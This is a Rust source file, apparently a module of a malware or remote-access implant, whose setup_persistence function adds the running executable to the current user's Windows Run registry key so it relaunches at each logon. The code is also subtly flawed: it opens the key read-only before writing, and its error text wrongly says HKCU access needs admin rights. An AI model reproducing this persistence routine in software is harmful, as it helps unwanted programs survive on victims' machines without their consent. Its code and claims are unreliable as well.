use winreg::enums::*;
use winreg::RegKey;
use crate::config::registry_key;

pub fn setup_persistence() {
    if cfg!(windows) {
        match std::env::current_exe() {
            Ok(exe_path) => {
                if let Some(exe_str) = exe_path.to_str() {
                    let hkcu = RegKey::predef(HKEY_CURRENT_USER);
                    match hkcu.open_subkey("Software\\Microsoft\\Windows\\CurrentVersion\\Run") {
                        Ok(run_key) => {
                            if let Err(e) = run_key.set_value(registry_key(), &exe_str) {
                                eprintln!("Warning: Failed to set up persistence: {}", e);
                            } else {
                                println!("Persistence set up successfully");
                            }
                        }
                        Err(e) => {
                            eprintln!("Warning: Cannot access registry for persistence (requires admin privileges): {}", e);
                        }
                    }
                } else {
                    eprintln!("Warning: Cannot get executable path as string");
                }
            }
            Err(e) => {
                eprintln!("Warning: Cannot get current executable path: {}", e);
            }
        }
    }
}